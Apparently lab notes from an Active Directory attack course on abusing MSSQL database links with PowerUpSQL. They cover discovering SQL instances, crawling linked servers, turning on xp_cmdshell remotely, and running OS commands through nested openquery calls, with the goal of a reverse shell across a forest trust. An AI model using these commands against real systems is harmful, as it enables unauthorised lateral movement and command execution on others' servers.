# MSSQL Servers

• MS SQL servers are generally deployed in plenty in a Windows domain. 

• SQL Servers provide very good options for lateral movement as domain users can be mapped to database roles. 

• For MSSQL and PowerShell hackery, lets use PowerUpSQL https://github.com/NetSPI/PowerUpSQL

#### Discovery (SPN Scanning) 
```powershell 
Get-SQLInstanceDomain 
```
####  Check Accessibility
```powershell
Get-SQLConnectionTestThreaded 
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded - Verbose 
```

#### Gather Information 
```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

• A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. 

• In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures. 

• Database links work even across forest trusts.

#### Look for links to remote servers 
```powershell
Get-SQLServerLink -Instance dcorp-mssql -Verbose 
```
##### Or
```sql
select * from master..sysservers
```

#### Enumerating Database Links - Manually 
• Openquery() function can be used to run queries on a linked database
```sql 
select * from openquery("dcorp-sql1",'select * from master..sysservers')
```

#### Enumerating Database Links - Crawls (Nested Link Enumeration)
```powershell 
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
```
##### or 
```sql
select * from openquery("dcorp-sql1",'select * from openquery("dcorpmgmt",''select * from master..sysservers'')')
```

#### Executing Commands 

- On the target server, either xp_cmdshell should be already enabled; 
- Or if rpcout is enabled (disabled by default), xp_cmdshell can be enabled using:
```sql
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
```

#### Executing Commands by Crawl (Nested Database Links)
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'"
```
##### or 

From the initial SQL server, OS commands can be executed using nested link queries: 
```sql 
select * from openquery("dcorp-sql1",'select * from openquery("dcorpmgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
```

# Learning Objective 22

Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.